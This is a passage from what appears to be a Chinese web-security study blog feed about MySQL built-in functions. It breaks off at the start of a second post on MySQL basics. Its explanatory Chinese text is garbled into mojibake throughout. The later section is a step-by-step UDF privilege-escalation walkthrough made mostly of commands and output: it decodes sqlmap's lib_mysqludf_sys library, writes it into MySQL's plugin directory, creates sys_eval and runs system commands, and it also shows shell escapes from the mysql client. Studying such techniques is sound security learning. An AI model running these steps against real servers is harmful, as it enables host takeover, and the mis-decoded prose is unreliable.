class="line">+---------------------------+</span><br></pre></td></tr></table></figure><p><strong>13.ISNULL(expression)</strong></p><p>åˆ¤æ–­è¡¨è¾¾å¼æ˜¯å¦ä¸º NULL</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT ISNULL(NULL);</span><br><span class="line">+--------------+</span><br><span class="line">| ISNULL(NULL) |</span><br><span class="line">+--------------+</span><br><span class="line">|            1 |</span><br><span class="line">+--------------+</span><br></pre></td></tr></table></figure><p><strong>14.LAST_INSERT_ID()</strong></p><p>è¿”å›æœ€è¿‘ç”Ÿæˆçš„ AUTO_INCREMENT å€¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT LAST_INSERT_ID();</span><br><span class="line">+------------------+</span><br><span class="line">| LAST_INSERT_ID() |</span><br><span class="line">+------------------+</span><br><span class="line">|                0 |</span><br><span class="line">+------------------+</span><br></pre></td></tr></table></figure><p><strong>15.NULLIF(expr1, expr2)</strong></p><p>æ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²ï¼Œå¦‚æœå­—ç¬¦ä¸² expr1 ä¸ expr2 ç›¸ç­‰ è¿”å› NULLï¼Œå¦åˆ™è¿”å› expr1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SELECT NULLIF(25, 25);</span><br><span class="line">+----------------+</span><br><span class="line">| NULLIF(25, 25) |</span><br><span class="line">+----------------+</span><br><span class="line">|           NULL |</span><br><span class="line">+----------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>16.VERSION()</strong></p><p>æŸ¥çœ‹MySQLç‰ˆæœ¬</p><p>è¿”å›æ•°æ®åº“çš„ç‰ˆæœ¬å·</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> SELECT VERSION();</span><br><span class="line">+-------------------------+</span><br><span class="line">| VERSION()               |</span><br><span class="line">+-------------------------+</span><br><span class="line">| 8.0.22-0ubuntu0.20.04.2 |</span><br><span class="line">+-------------------------+</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>17.MD5()</strong></p><p>åŠ å¯†å‡½æ•°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT MD5(&#39;123456&#39;);</span><br><span class="line">+----------------------------------+</span><br><span class="line">| MD5(&#39;123456&#39;)                    |</span><br><span class="line">+----------------------------------+</span><br><span class="line">| e10adc3949ba59abbe56e057f20f883e |</span><br><span class="line">+----------------------------------+</span><br></pre></td></tr></table></figure><p><strong>18.IPåœ°å€ä¸æ•°å­—ç›¸äº’è½¬æ¢çš„å‡½æ•°</strong></p><ul><li>INET_ATON(IP)</li></ul><p>IPåœ°å€è½¬æ¢ä¸ºæ•°å­—è¡¨ç¤º</p><ul><li>INET_NTOA(n)</li></ul><p>å°†æ•°å­—nè½¬æ¢æˆIPå½¢å¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">SELECT INET_ATON(&#39;192.168.0.1&#39;);</span><br><span class="line">+--------------------------+</span><br><span class="line">| INET_ATON(&#39;192.168.0.1&#39;) |</span><br><span class="line">+--------------------------+</span><br><span class="line">|               3232235521 |</span><br><span class="line">+--------------------------+</span><br><span class="line">SELECT INET_NTOA(3232235521);</span><br><span class="line">+-----------------------+</span><br><span class="line">| INET_NTOA(3232235521) |</span><br><span class="line">+-----------------------+</span><br><span class="line">| 192.168.0.1           |</span><br><span class="line">+-----------------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>19.åŠ é”å‡½æ•°å’Œè§£é”å‡½æ•°</strong></p><ul><li>GET_LOCK(name,time)å‡½æ•°å®šä¹‰ä¸€ä¸ªåç§°ä¸ºnameã€æŒç»­æ—¶é—´é•¿åº¦ä¸ºtimeç§’çš„é”ã€‚å¦‚æœé”å®šæˆåŠŸï¼Œåˆ™è¿”å›1ï¼›å¦‚æœå°è¯•è¶…æ—¶ï¼Œåˆ™è¿”å›0ï¼›å¦‚æœé‡åˆ°é”™è¯¯ï¼Œè¿”å›NULLã€‚</li><li>RELEASE_LOCK(name)å‡½æ•°è§£é™¤åç§°ä¸ºnameçš„é”ã€‚å¦‚æœè§£é”æˆåŠŸï¼Œåˆ™è¿”å›1ï¼›å¦‚æœå°è¯•è¶…æ—¶ï¼Œè¿”å›0ï¼›å¦‚æœè§£é”å¤±è´¥ï¼Œè¿”å›NULLï¼›</li><li>IS_FREE_LOCK(name)å‡½æ•°åˆ¤æ–­æ˜¯å¦å·²ä½¿ç”¨åä¸ºnameçš„é”å®šã€‚å¦‚æœä½¿ç”¨ï¼Œè¿”å›0ï¼Œå¦åˆ™ï¼Œè¿”å›1ï¼›</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">SELECT GET_LOCK(&#39;MySQL&#39;,10);</span><br><span class="line">+----------------------+</span><br><span class="line">| GET_LOCK(&#39;MySQL&#39;,10) |</span><br><span class="line">+----------------------+</span><br><span class="line">|                    1 |</span><br><span class="line">+----------------------+</span><br><span class="line">SELECT IS_FREE_LOCK(&#39;MySQL&#39;);</span><br><span class="line">+-----------------------+</span><br><span class="line">| IS_FREE_LOCK(&#39;MySQL&#39;) |</span><br><span class="line">+-----------------------+</span><br><span class="line">|                     0 |</span><br><span class="line">+-----------------------+</span><br><span class="line">SELECT RELEASE_LOCK(&#39;MySQL&#39;);</span><br><span class="line">+-----------------------+</span><br><span class="line">| RELEASE_LOCK(&#39;MySQL&#39;) |</span><br><span class="line">+-----------------------+</span><br><span class="line">|                     1 |</span><br><span class="line">+-----------------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>20.@@datadir</strong>                                       æ•°æ®åº“è·¯å¾„</p><p>â€‹      <strong>@@version_compile_os</strong>               æ“ä½œç³»ç»Ÿç‰ˆæœ¬</p><p><strong>21.sleep(N)</strong></p><p>æ‰§è¡Œselect sleep(N)å¯ä»¥è®©æ­¤è¯­å¥è¿è¡ŒNç§’é’Ÿ</p><p>å‰ææ¡ä»¶: æŒ‡å®šæ¡ä»¶çš„è®°å½•å­˜åœ¨æ—¶æ‰ä¼šåœæ­¢æŒ‡å®šçš„ç§’æ•°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select sleep(1),database(),version(),user();</span><br><span class="line">+----------+------------+-------------------------+----------------+</span><br><span class="line">| sleep(1) | database() | version()               | user()         |</span><br><span class="line">+----------+------------+-------------------------+----------------+</span><br><span class="line">|        0 | test       | 8.0.22-0ubuntu0.20.04.2 | root@localhost |</span><br><span class="line">+----------+------------+-------------------------+----------------+</span><br><span class="line">1 row in set (1.00 sec)</span><br></pre></td></tr></table></figure><h1 id="MySQL-æ‰§è¡Œç³»ç»Ÿå‘½ä»¤"><a href="#MySQL-æ‰§è¡Œç³»ç»Ÿå‘½ä»¤" class="headerlink" title="MySQL æ‰§è¡Œç³»ç»Ÿå‘½ä»¤"></a>MySQL æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</h1><p>åœ¨ MySQL çš„å‘½ä»¤è¡Œç•Œé¢ä¸­å¯ä»¥ä½¿ç”¨ <code>system shell-cmd</code> æˆ–è€…<code>\! shell-cmd</code> æ ¼å¼æ‰§è¡Œ shell å‘½ä»¤ã€‚</p><p><strong>å®ä¾‹ï¼š</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; system ls &#x2F;var&#x2F;www</span><br><span class="line">example.com  html</span><br><span class="line">mysql&gt; \! ls &#x2F;var&#x2F;www</span><br><span class="line">example.com  html</span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥æ‰“å¼€ä¸€ä¸ªæ–°çš„ shellï¼Œå…³é—­ shell (ä½¿ç”¨ exit æˆ–è€… CTRL D)åè¿”å› MySQL å‘½ä»¤è¡Œç•Œé¢ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; \! bash</span><br><span class="line">root@linux:&#x2F;var&#x2F;www&#x2F;html&#x2F;project# cd ~</span><br><span class="line">root@linux:~# ls</span><br><span class="line">snap</span><br><span class="line">root@linux:~# exit</span><br><span class="line">exit</span><br><span class="line">mysql&gt; </span><br></pre></td></tr></table></figure><h1 id="UDFææƒæ‰§è¡Œç³»ç»Ÿå‘½ä»¤"><a href="#UDFææƒæ‰§è¡Œç³»ç»Ÿå‘½ä»¤" class="headerlink" title="UDFææƒæ‰§è¡Œç³»ç»Ÿå‘½ä»¤"></a>UDFææƒæ‰§è¡Œç³»ç»Ÿå‘½ä»¤</h1><blockquote><p>UDF ä¸º â€œUser-Defined Functionâ€ çš„æ‰€å†™ï¼Œå³ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ã€‚MySQL å…è®¸ç”¨æˆ·æ·»åŠ æ–°çš„å‡½æ•°ï¼Œå…¶ä¸­ä¸€ç§æ–¹æ³•å°±æ˜¯é€šè¿‡å…¶æä¾›çš„ UDF æ¥å£ï¼Œæ·»åŠ ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ã€‚ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°å¯ä»¥ä½¿ç”¨ C/C++ è¯­è¨€ç¼–å†™å¹¶ç¼–è¯‘æˆåº“æ–‡ä»¶ï¼ˆå…¶å®ƒè¯­è¨€ä¹Ÿå¯ä»¥ï¼Œåªè¦èƒ½ç¼–è¯‘æˆå…±äº«åº“æ–‡ä»¶ï¼‰ï¼Œæ”¾åˆ° MySQL æŒ‡å®šçš„ç›®å½•ä¸‹ï¼Œä»¥ä¾¿ MySQL èƒ½åŠ¨æ€åŠ è½½ç”¨æˆ·è‡ªå®šä¹‰çš„å‡½æ•°ã€‚</p><p>ä½¿ç”¨ UDF å¯ä»¥åŠ è½½è‡ªå®šä¹‰çš„å‡½æ•°ï¼Œå› æ­¤å¯ä»¥é€šè¿‡è‡ªå®šä¹‰å‡½æ•°æ‰§è¡Œå„ç§æ“ä½œï¼Œå…³äºç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°çš„ç¼–å†™å¯å‚è€ƒï¼Œ<a href="https://docstore.mik.ua/orelly/weblinux2/mysql/ch14_01.htm">Extending MySQL</a></p></blockquote><h2 id="udfææƒ"><a href="#udfææƒ" class="headerlink" title="udfææƒ"></a>udfææƒ</h2><p><strong>1ï¼‰åŸç†</strong>ï¼šUDFææƒæ˜¯åˆ©ç”¨MySQLçš„è‡ªå®šä¹‰å‡½æ•°åŠŸèƒ½ï¼Œæ„é€ ç‰¹å®šçš„DLLå°†Mysqlè´¦å·è½¬åŒ–ä¸ºç³»ç»Ÿsystemæƒé™</p><p><strong>2ï¼‰æ¡ä»¶</strong></p><ul><li>MySQL ç”¨æˆ·èƒ½å†™æ–‡ä»¶åˆ° MySQL æŒ‡å®šçš„è‡ªå®šä¹‰å‡½æ•°åº“å­˜æ”¾ç›®å½•ã€‚</li><li>MySQL ç”¨æˆ·å…·æœ‰ <code>INSERT</code> æƒé™ï¼Œæ‰èƒ½ä½¿ç”¨ <code>CREATE FUNCTION</code>è¯­å¥åœ¨ MySQL ä¸­æ·»åŠ è‡ªå®šä¹‰çš„å‡½æ•°ï¼Œæ­¤å¤–å¦‚æœä½¿ç”¨ <code>DROP FUNCTION</code> è¯­å¥åˆ é™¤è‡ªå®šä¹‰å‡½æ•°ï¼Œè¿˜éœ€è¦æœ‰ <code>DELETE</code> æƒé™ã€‚</li></ul><p>æŸ¥çœ‹<code>secure_file_priv</code>çš„å€¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">show global variables like &#39;secure%&#39;;</span><br><span class="line">å½“secure_file_privçš„å€¼ä¸ºNULLæˆ–&#x2F;tmp&#x2F;æ—¶ï¼Œæ­¤æ—¶æ— æ³•ææƒ</span><br><span class="line">å½“secure_file_privçš„å€¼æ²¡æœ‰å…·ä½“å€¼æ—¶ï¼Œåˆ™å¯ä»¥ææƒ</span><br></pre></td></tr></table></figure><h2 id="udfæ–‡ä»¶"><a href="#udfæ–‡ä»¶" class="headerlink" title="udfæ–‡ä»¶"></a>udfæ–‡ä»¶</h2><p>å¯¹äºudfæ–‡ä»¶ï¼Œåœ¨sqlmapå·¥å…·ä¸­è‡ªå¸¦å°±æœ‰ï¼Œæˆ–<a href="https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql">github</a>é‡Œæœç´¢ï¼Œåªè¦æ‰¾å¯¹åº”æ“ä½œç³»ç»Ÿçš„ç‰ˆæœ¬å³å¯</p><p>æŸ¥çœ‹ç³»ç»Ÿæ¶æ„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#39;%compile%&#39;;         æŸ¥çœ‹ä¸»æœºç‰ˆæœ¬åŠæ¶æ„</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201125173019139.png" alt="image-20201125173019139"></p><p>Windowsä¸‹æ˜¯.dllæ–‡ä»¶ï¼›linuxä¸‹æ˜¯.soæ–‡ä»¶</p><p>åœ¨ sqlmap\data\udf\mysql\windows|linux\64|32ç›®å½•ä¸‹å­˜æ”¾ç€lib_mysqludf_sys.dll__|.so_</p><p>ä½†æ˜¯sqlmap ä¸­ è‡ªå¸¦ çš„shell ä»¥åŠä¸€äº›äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä¸ºäº†é˜²æ­¢è¢«è¯¯æ€éƒ½ç»è¿‡å¼‚æˆ–æ–¹å¼ç¼–ç ï¼Œä¸èƒ½ç›´æ¥ä½¿ç”¨,å¯ä»¥åˆ©ç”¨sqlmap è‡ªå¸¦çš„è§£ç å·¥å…·cloak.pyè§£ç åï¼Œå†ç›´æ¥åˆ©ç”¨ã€‚</p><p>è¿›å…¥åˆ° sqlmap\extra\cloak ç›®å½•ä¸‹ï¼Œæ‰§è¡Œå‘½ä»¤ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python clock.py -d -i &#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;data&#x2F;udf&#x2F;mysql&#x2F;linux&#x2F;64&#x2F;lib_mysqludf_sys.so_</span><br></pre></td></tr></table></figure><p>ç„¶åä¼šç”Ÿæˆä¸€ä¸ªlib_mysqludf_sys.soæ–‡ä»¶</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201125173442662.png" alt="image-20201125173442662"></p><h2 id="ä½¿ç”¨udf"><a href="#ä½¿ç”¨udf" class="headerlink" title="ä½¿ç”¨udf"></a>ä½¿ç”¨udf</h2><p><strong>1)å°†udfæ–‡ä»¶æ”¾åˆ°æŒ‡å®šä½ç½®</strong></p><p>å¾—åˆ°æ’ä»¶åº“è·¯å¾„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &quot;%plugin%&quot;;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201125180437269.png" alt="image-20201125180437269"></p><p>å¾—åˆ°udfæ–‡ä»¶çš„åå…­è¿›åˆ¶æ ¼å¼ï¼Œå¯åœ¨æœ¬åœ°é€šè¿‡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select hex(load_file(&#39;&#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;udf&#x2F;mysql&#x2F;linux&#x2F;64&#x2F;lib_mysqludf_sys.so&#39;)) into outfile &#39;&#x2F;tmp&#x2F;udf.txt&#39;;</span><br></pre></td></tr></table></figure><p>#windowsä¸‹cmdå‘½ä»¤è¡Œå¤„ç†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -encodehex -f -v lib_mysqludf_sys.dll 1.txt 4</span><br></pre></td></tr></table></figure><p>å†™å…¥æ’ä»¶åº“</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#39;7F454C46020...&#39; into dumpfile &#39;&#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F;lib_mysqludf_sys.so&#39;;</span><br></pre></td></tr></table></figure><p><strong>2)ä»udfæ–‡ä»¶ä¸­å¼•å…¥è‡ªå®šä¹‰å‡½æ•°</strong></p><p>æŸ¥çœ‹ä¸‹è¿™ä¸ªudfåº“æ‰€æ”¯æŒçš„å‡½æ•°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">root@linux:~# nm -D &#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F;lib_mysqludf_sys.so</span><br><span class="line">         w _Jv_RegisterClasses</span><br><span class="line">0000000000201788 A __bss_start</span><br><span class="line">         w __cxa_finalize</span><br><span class="line">         w __gmon_start__</span><br><span class="line">0000000000201788 A _edata</span><br><span class="line">0000000000201798 A _end</span><br><span class="line">0000000000001178 T _fini</span><br><span class="line">0000000000000ba0 T _init</span><br><span class="line">         U fgets</span><br><span class="line">         U fork</span><br><span class="line">         U free</span><br><span class="line">         U getenv</span><br><span class="line">000000000000101a T lib_mysqludf_sys_info</span><br><span class="line">0000000000000da4 T lib_mysqludf_sys_info_deinit</span><br><span class="line">0000000000001047 T lib_mysqludf_sys_info_init</span><br><span class="line">         U malloc</span><br><span class="line">         U mmap</span><br><span class="line">         U pclose</span><br><span class="line">         U popen</span><br><span class="line">         U realloc</span><br><span class="line">         U setenv</span><br><span class="line">         U strcpy</span><br><span class="line">         U strncpy</span><br><span class="line">0000000000000dac T sys_bineval</span><br><span class="line">0000000000000dab T sys_bineval_deinit</span><br><span class="line">0000000000000da8 T sys_bineval_init</span><br><span class="line">0000000000000e46 T sys_eval</span><br><span class="line">0000000000000da7 T sys_eval_deinit</span><br><span class="line">0000000000000f2e T sys_eval_init</span><br><span class="line">0000000000001066 T sys_exec</span><br><span class="line">0000000000000da6 T sys_exec_deinit</span><br><span class="line">0000000000000f57 T sys_exec_init</span><br><span class="line">00000000000010f7 T sys_get</span><br><span class="line">0000000000000da5 T sys_get_deinit</span><br><span class="line">0000000000000fea T sys_get_init</span><br><span class="line">000000000000107a T sys_set</span><br><span class="line">00000000000010e8 T sys_set_deinit</span><br><span class="line">0000000000000f80 T sys_set_init</span><br><span class="line">         U sysconf</span><br><span class="line">         U system</span><br><span class="line">         U waitpid</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åˆ›å»ºå‡½æ•°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; create function sys_eval returns string soname &quot;lib_mysqludf_sys.so&quot;;</span><br><span class="line">Query OK, 0 rows affected (0.14 sec)</span><br></pre></td></tr></table></figure><p><strong>3)æ‰§è¡Œè‡ªå®šä¹‰å‡½æ•°</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select sys_eval(&#39;whoami&#39;);</span><br><span class="line">+--------------------+</span><br><span class="line">| sys_eval(&#39;whoami&#39;) |</span><br><span class="line">+--------------------+</span><br><span class="line">| mysql       |</span><br><span class="line">+--------------------+</span><br><span class="line">1 row in set (0.04 sec)</span><br><span class="line"> </span><br><span class="line">mysql&gt; select * from mysql.func;</span><br><span class="line">+----------+-----+-------------+----------+</span><br><span class="line">| name   | ret | dl     | type   |</span><br><span class="line">+----------+-----+-------------+----------+</span><br><span class="line">| sys_eval |  0 | lib_mysqludf_sys.so | function |</span><br><span class="line">+----------+-----+-------------+----------+</span><br><span class="line">1 row in set</span><br><span class="line"></span><br><span class="line">mysql&gt; drop function sys_eval;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from func;</span><br><span class="line">Empty set (0.00 sec)</span><br></pre></td></tr></table></figure><h1 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h1><p>[1] <a href="https://blog.csdn.net/hellokandy/article/details/82964077">MySQL å¸¸ç”¨å†…ç½®å‡½æ•°ä¸æ‰€æœ‰å†…ç½®å‡½æ•°</a></p><p>[2] <a href="https://blog.csdn.net/qq_34845394/article/details/90077070">MySQLå¸¸ç”¨å†…ç½®å‡½æ•°</a></p><p>[3] <a href="https://www.cnblogs.com/litlife/p/9030673.html">udfææƒåŸç†è¯¦è§£</a></p><p>[4] <a href="https://www.jb51.net/article/51767.htm">Linuxåˆ©ç”¨UDFåº“å®ç°Mysqlææƒ</a></p><p>[5] <a href="https://blog.csdn.net/qq_36119192/article/details/84863268?utm_medium=distribute.pc_relevant.none-task-blog-baidulandingword-2&spm=1001.2101.3001.4242">MySQL UDFææƒæ‰§è¡Œç³»ç»Ÿå‘½ä»¤</a></p><p>[6] <a href="https://blog.csdn.net/Zlirving_/article/details/106423442?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1.control&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1.control">Mysqlâ€”â€”udfææƒ</a></p><p>[7] <a href="https://bingslient.github.io/2019/10/31/MySQL%20%E5%87%BD%E6%95%B0%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8">MySQL å‡½æ•°åŠå…¶åˆ©ç”¨</a></p>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨å­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Webå®‰å…¨å­¦ä¹  </tag>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQLåŸºç¡€æ“ä½œå­¦ä¹ </title>
      <link href="posts/8774.html"/>
      <url>posts/8774.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>è®¤è¯†æ•°æ®åº“</p><ul><li>æ•°æ®åº“ : ç”¨æ¥å­˜å‚¨æµ·é‡æ•°æ®çš„ä»“åº“ ã€‚</li><li>SQL ï¼šç”¨äºè®¿é—®å’Œå¤„ç†æ•°æ®åº“çš„è®¡ç®—æœºè¯­è¨€ã€‚</li></ul><p>åˆ†ç±»ï¼š</p><ul><li>å…³ç³»å‹æ•°æ®åº“ï¼ˆäºŒç»´è¡¨æ ¼å½¢å¼ï¼‰ï¼šOracle,MySQL,MariaDB,SQL Serverâ€¦</li><li>éå…³ç³»å‹æ•°æ®åº“ï¼ˆnot only sqlï¼‰: Memcached,redis,MongoDBâ€¦</li></ul></blockquote><h1 id="MySQLåŸºç¡€æ“ä½œ"><a href="#MySQLåŸºç¡€æ“ä½œ" class="headerlink" title="MySQLåŸºç¡€æ“ä½œ"></a>MySQLåŸºç¡€æ“ä½œ</h1><p>å®‰è£…mysql</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install mysql-server mysql-client</span><br></pre></td></tr></table></figure><p>ç™»å½•mysql</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/zXqlJhGSIiWtvbD.png" alt="image-20201109225823132"></p><p>é€€å‡ºmysql</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\q </span><br></pre></td></tr></table></figure><p>å½“å‰ç”¨æˆ·</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT USER();</span><br></pre></td></tr></table></figure><p>å½“å‰æ—¥æœŸæ—¶é—´</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT NOW();</span><br></pre></td></tr></table></figure><p>å½“å‰ç‰ˆæœ¬ä¿¡æ¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT VERSION();</span><br></pre></td></tr></table></figure><p>æœåŠ¡å™¨çŠ¶æ€</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW STATUS;</span><br></pre></td></tr></table></figure><p>æœåŠ¡å™¨é…ç½®å˜é‡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW VARIABLES;</span><br></pre></td></tr></table></figure><h2 id="ç”¨æˆ·ç›¸å…³å‘½ä»¤"><a href="#ç”¨æˆ·ç›¸å…³å‘½ä»¤" class="headerlink" title="ç”¨æˆ·ç›¸å…³å‘½ä»¤"></a>ç”¨æˆ·ç›¸å…³å‘½ä»¤</h2><p>ï¼ˆ1ï¼‰åˆ›å»ºç”¨æˆ·</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create user &#39;name&#39;@&#39;host&#39; identified by &#39;password&#39;;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/sWatwF4vhOJYTNA.png" alt="image-20201112171427748"></p><p>ï¼ˆ2ï¼‰åˆ é™¤ç”¨æˆ·</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drop user name@&#39;host&#39;;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/oe5ZK9Fv1qEkCAQ.png" alt="image-20201112171814162"></p><p>ï¼ˆ3ï¼‰ä¸ºç”¨æˆ·æˆæƒ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grant some_privileges on *.* to &#39;name&#39;@&#39;host&#39;;</span><br><span class="line">flush 